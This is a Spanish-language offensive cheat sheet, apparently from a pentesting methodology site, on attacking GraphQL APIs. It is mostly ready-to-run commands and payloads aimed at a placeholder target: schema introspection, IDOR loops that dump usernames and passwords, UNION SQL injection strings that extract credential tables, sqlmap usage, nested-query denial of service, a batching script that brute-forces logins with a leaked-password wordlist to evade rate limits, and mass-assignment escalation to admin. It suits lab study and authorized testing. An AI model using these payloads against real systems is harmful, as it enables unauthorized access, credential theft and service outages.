---
title: "Attacking GraphQL"
description: "Introspección, queries maliciosas, injection y auth bypass en GraphQL."
sidebar:
  order: 14
  label: "Attacking GraphQL"
---
> Intrusión en APIs GraphQL: fingerprint, introspección, IDOR, SQLi, DoS por query circular, batching brute-force y privilege escalation via mutations.

---


## Fingerprint y localización

```bash
# Endpoints comunes de GraphQL
/graphql
/api/graphql
/graphql/v1
/api/v1/graphql
/graph

# Verificar si hay GraphiQL (interfaz web interactiva)
curl -s http://TARGET/graphql | grep -i "graphiql\|graphql"

# graphw00f — fingerprint del engine
git clone https://github.com/dolevf/graphw00f
cd graphw00f
pip3 install -r requirements.txt

python3 main.py -d -f -t http://TARGET
# Engines detectados: Graphene, Apollo, Hasura, GraphQL-Go, Sangria, etc.
# -d: detect endpoint automáticamente
# -f: fingerprint del engine
# También devuelve enlace al GraphQL-Threat-Matrix con configuraciones por defecto
```

---

## Introspección — Enumerar el schema

### Queries básicas de introspección

```graphql
# Listar todos los tipos
{
  __schema {
    types {
      name
    }
  }
}

# Campos de un tipo específico
{
  __type(name: "UserObject") {
    name
    fields {
      name
      type {
        name
        kind
      }
    }
  }
}

# Queries disponibles
{
  __schema {
    queryType {
      fields {
        name
        description
      }
    }
  }
}

# Mutations disponibles + argumentos
query {
  __schema {
    mutationType {
      name
      fields {
        name
        args {
          name
          defaultValue
          type { kind name ofType { kind name } }
        }
      }
    }
  }
}

# Campos de un tipo de input (para mutations)
{
  __type(name: "RegisterUserInput") {
    name
    inputFields {
      name
      description
      defaultValue
    }
  }
}
```

### Introspección completa (dump total del schema)

```graphql
query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types { ...FullType }
    directives {
      name description locations
      args { ...InputValue }
    }
  }
}
fragment FullType on __Type {
  kind name description
  fields(includeDeprecated: true) {
    name description
    args { ...InputValue }
    type { ...TypeRef }
    isDeprecated deprecationReason
  }
  inputFields { ...InputValue }
  interfaces { ...TypeRef }
  enumValues(includeDeprecated: true) { name description isDeprecated deprecationReason }
  possibleTypes { ...TypeRef }
}
fragment InputValue on __InputInput {
  name description
  type { ...TypeRef }
  defaultValue
}
fragment TypeRef on __Type {
  kind name
  ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name } } } } } } }
}
```

### Visualizar schema con GraphQL-Voyager

```
1. Ejecutar el IntrospectionQuery completo → copiar el resultado JSON
2. Ir a: https://graphql-kit.com/graphql-voyager/
   (En engagement real: clonar el repo y hostear local)
3. Clic en "CHANGE SCHEMA" → "INTROSPECTION" → pegar resultado → "DISPLAY"
4. Resultado: diagrama visual de todas las entidades y relaciones
   → Buscar loops (ej: User ↔ Post) para ataques DoS
   → Identificar campos sensibles (password, role, admin)
```

### cURL con introspección

```bash
# Query via cURL (escapar comillas dentro del JSON)
curl -s -X POST http://TARGET/graphql \
     -H "Content-Type: application/json" \
     -d '{"query":"{ __schema { types { name } } }"}' | jq

# Listar queries
curl -s -X POST http://TARGET/graphql \
     -H "Content-Type: application/json" \
     -d '{"query":"{ __schema { queryType { fields { name description } } } }"}' | jq

# Tipos de un objeto
curl -s -X POST http://TARGET/graphql \
     -H "Content-Type: application/json" \
     -d '{"query":"{ __type(name: \"UserObject\") { name fields { name type { name kind } } } }"}' | jq
```

---

## IDOR en GraphQL

```bash
# 1. Identificar query que usa argumento de usuario
# Ej: user(username: "htb-stdnt") { id username role }

# 2. Cambiar el argumento al usuario objetivo
curl -s -X POST http://TARGET/graphql \
     -H "Content-Type: application/json" \
     -d '{"query":"{ user(username: \"admin\") { id username role } }"}' | jq

# 3. Añadir campo password (identificado via introspección)
curl -s -X POST http://TARGET/graphql \
     -H "Content-Type: application/json" \
     -d '{"query":"{ user(username: \"admin\") { username password } }"}' | jq

# Enumerar todos los usuarios con su password
curl -s -X POST http://TARGET/graphql \
     -H "Content-Type: application/json" \
     -d '{"query":"{ users { id username password role } }"}' | jq

# IDOR por ID numérico
for i in $(seq 1 50); do
    curl -s -X POST http://TARGET/graphql \
         -H "Content-Type: application/json" \
         -d "{\"query\":\"{ user(id: $i) { id username password role } }\"}" | jq -c '.'
done
```

---

## SQL Injection en GraphQL

```graphql
# 1. Confirmar SQLi — inyectar comilla simple
{
  user(username: "htb-stdnt'") {
    username
  }
}
# Si responde con error SQL → vulnerable

# 2. Boolean blind — comentar el resto del WHERE
{
  user(username: "htb-stdnt' --") {
    username
  }
}
# Si devuelve el mismo resultado que sin payload → comentario funciona → SQLi confirmado

# 3. UNION-based — enumerar tablas
# (adaptar el número de columnas al resultado de introspección)
{
  user(username: "x' UNION SELECT 1,2,GROUP_CONCAT(table_name),4,5,6 FROM information_schema.tables WHERE table_schema=database()-- -") {
    username
  }
}

# 4. UNION — dump de columnas de una tabla
{
  user(username: "x' UNION SELECT 1,2,GROUP_CONCAT(column_name),4,5,6 FROM information_schema.columns WHERE table_name='users'-- -") {
    username
  }
}

# 5. UNION — extraer datos
{
  user(username: "x' UNION SELECT 1,2,GROUP_CONCAT(username,0x3a,password SEPARATOR 0x0a),4,5,6 FROM users-- -") {
    username
  }
}
```

```bash
# Via cURL (escapar comillas dobles con \")
curl -s -X POST http://TARGET/graphql \
     -H "Content-Type: application/json" \
     -d '{"query":"{ user(username: \"x'"'"' UNION SELECT 1,2,GROUP_CONCAT(table_name),4,5,6 FROM information_schema.tables WHERE table_schema=database()-- -\") { username } }"}' | jq

# SQLMap contra GraphQL (experimentar con --data y --level)
sqlmap -u "http://TARGET/graphql" \
       --data='{"query":"{ user(username: \"*\") { username } }"}' \
       --headers="Content-Type: application/json" \
       --level=3 --risk=2 --batch --dbms=mysql
```

---

## DoS — Query circular

```graphql
# Identificar loop en Voyager: ej. UserObject.posts → PostObject.author → UserObject
# Explotar el loop anidando niveles (respuesta crece exponencialmente)

# Nivel 3 — baseline (respuesta grande)
{
  posts {
    author {
      posts {
        edges {
          node {
            author {
              username
            }
          }
        }
      }
    }
  }
}

# Nivel alto — puede crashear el servidor/GraphiQL
# (repetir el patrón posts → author → posts → edges → node → author... N veces)
```

> **Nota:** En CTFs/examen, demostrar la vulnerabilidad con 3-4 niveles es suficiente para el reporte. No es necesario crashear el servidor real.

---

## Batching — Brute-Force bypass de rate limit

```bash
# Batching = múltiples queries en un solo HTTP request (JSON array)

# Ejemplo: 2 queries normales en 1 request
curl -s -X POST http://TARGET/graphql \
     -H "Content-Type: application/json" \
     -d '[
       {"query":"{ user(username: \"admin\") { uuid } }"},
       {"query":"{ post(id: 1) { title } }"}
     ]' | jq

# Brute-force de login via batching (evadir rate limit por request)
# Generar JSON array con N queries de login diferentes:
python3 -c "
import json

passwords = open('/usr/share/seclists/Passwords/Leaked-Databases/rockyou-75.txt').read().splitlines()
batch = []
for pwd in passwords[:500]:  # 500 intentos en 1 request
    batch.append({'query': f'mutation {{ login(username: \"admin\", password: \"{pwd}\") {{ token }} }}'})
print(json.dumps(batch))
" > batch_payload.json

curl -s -X POST http://TARGET/graphql \
     -H "Content-Type: application/json" \
     -d @batch_payload.json | jq '.[].data.login | select(. != null)'
```

---

## Mutations — Privilege Escalation

```graphql
# 1. Descubrir mutations disponibles (ver sección introspección)
# 2. Identificar campos privilegiados en el input (ej: "role")

# Registrar usuario normal
mutation {
  registerUser(input: {
    username: "attacker"
    password: "5f4dcc3b5aa765d61d8327deb882cf99"
    role: "user"
    msg: "test"
  }) {
    user { username role }
  }
}

# Mass Assignment en mutation: inyectar role:"admin"
mutation {
  registerUser(input: {
    username: "attacker_admin"
    password: "5f4dcc3b5aa765d61d8327deb882cf99"
    role: "admin"
    msg: "Hacked!"
  }) {
    user { username role }
  }
}
# Si response refleja role:"admin" → escalada exitosa

# Otros campos privilegiados a probar en mutations:
# isAdmin: true
# verified: true
# approved: true
# accountType: "premium"
```

```bash
# MD5 de password para mutations que lo requieran
echo -n 'password' | md5sum
# → 5f4dcc3b5aa765d61d8327deb882cf99

# Ejecutar mutation via cURL
curl -s -X POST http://TARGET/graphql \
     -H "Content-Type: application/json" \
     -d '{"query":"mutation { registerUser(input: {username: \"attacker\", password: \"5f4dcc3b5aa765d61d8327deb882cf99\", role: \"admin\", msg: \"test\"}) { user { username role } } }"}' | jq
```

---

## GraphQL-Cop — Audit automático

```bash
# Instalación
git clone https://github.com/dolevf/graphql-cop
cd graphql-cop
pip3 install -r requirements.txt

# Audit básico (sin auth)
python3 graphql-cop.py -t http://TARGET/graphql

# Con auth (bearer token)
python3 graphql-cop.py -t http://TARGET/graphql \
     -H "Authorization: Bearer TOKEN"

# Output típico:
# [HIGH] Alias Overloading - DoS via 100+ aliases
# [HIGH] Array-based Query Batching - Batching habilitado → brute-force amplification
# [HIGH] Directive Overloading - DoS via directives duplicados
# [HIGH] Field Duplication - DoS via 500 campos repetidos
# [HIGH] Introspection - Información del schema expuesta
# [MEDIUM] GET Method Query Support - CSRF posible
# [LOW] Field Suggestions - Leakage de nombres de campo
# [LOW] GraphiQL IDE - Interfaz de debug expuesta
```

---

## InQL (Burp Extension)

```
Instalación:
  Burp → Extensions → BApp Store → buscar "InQL" → Install

Funcionalidades clave:
  1. Tab "InQL" → introducir URL del GraphQL → "Analyze" → lista todas las queries/mutations
  2. En Proxy History / Repeater: tab "GraphQL" → editar query sin lidiar con JSON
  3. Click derecho en request GraphQL → Extensions → InQL → "Generate queries with InQL Scanner"
  4. Batch attack desde InQL → click derecho → "InQL - Batch Attack"

Útil para:
  - Generar automáticamente queries para todos los tipos
  - Modificar queries de forma legible (sin escaping de comillas)
  - Identificar campos disponibles sin introspección manual
```

---

## Referencia rápida — Vulnerabilidades GraphQL

| Vulnerabilidad | Señal | Ataque |
|----------------|-------|--------|
| IDOR | Query acepta username/id → devuelve datos ajenos | Cambiar argumento por otro usuario |
| SQLi | `'` en argumento → error SQL en response | `' UNION SELECT ... -- -` |
| XSS | Argumento reflejado en error HTML sin encode | `<script>alert(1)</script>` en arg entero |
| DoS | Loop entre tipos (User↔Post) | Anidar el loop 10+ niveles |
| Batching abuse | Batching habilitado + login en mutation | JSON array con 1000 queries |
| Privilege escalation | Mutation con campo `role` en input | `role: "admin"` en registerUser |
| Info Disclosure | Introspección habilitada | `__schema { types { name } }` |
| Info Disclosure | Field suggestions activas | Errores con "Did you mean..." |

---

## Pitfalls / Gotchas

- **Introspección deshabilitada:** si `__schema` devuelve error, probar field suggestions: escribir un campo incorrecto y ver si el error dice "Did you mean X?" — el engine sugiere nombres reales.
- **Conexiones (edges/node) en queries:** algunos tipos son `connection` (paginación Relay). Para acceder a los objetos: `{ posts { edges { node { title } } } }` — olvidar `edges`/`node` da error.
- **SQLi: número de columnas en UNION:** usar introspección para contar los campos del tipo devuelto. Un `UserObject` con 6 campos necesita `UNION SELECT 1,2,3,4,5,6`.
- **GraphQL vía GET también funciona:** `GET /graphql?query={users{username}}` — si está habilitado, puede ser CSRF vectorizable.
- **DoS: no crashear el target real:** demostrar con 3-4 niveles. Los labs de HTB sí se pueden crashear; en un pentest real, parar antes.
- **Mutations con password MD5:** algunos backends esperan el password ya hasheado en la mutation — verificar en el schema o interceptando el registro normal.
- **Batching puede estar deshabilitado:** si el array JSON devuelve error, verificar que graphql-cop lo reporta como habilitado primero.
- **GraphiQL en producción = hallazgo por sí mismo:** la interfaz de debug expuesta es un finding de Medium/High — permite ejecutar queries directamente desde el browser sin auth adicional.

---

## Cheatsheets relacionados

- [API Attacks](/metodologias/web/api-attacks/) — OWASP API Top 10, BOLA/IDOR en REST
- [Web Requests](/metodologias/fundamentos/web-requests/) — cURL para queries GraphQL manuales
- [Web Fuzzing](/metodologias/recon/web-fuzzing/) — descubrir el endpoint /graphql con ffuf
- [Broken Authentication](/metodologias/web/broken-authentication/) — brute-force de credenciales
- [Server-side Attacks](/metodologias/web/server-side-attacks/) — SSRF posible via campos URI en mutations
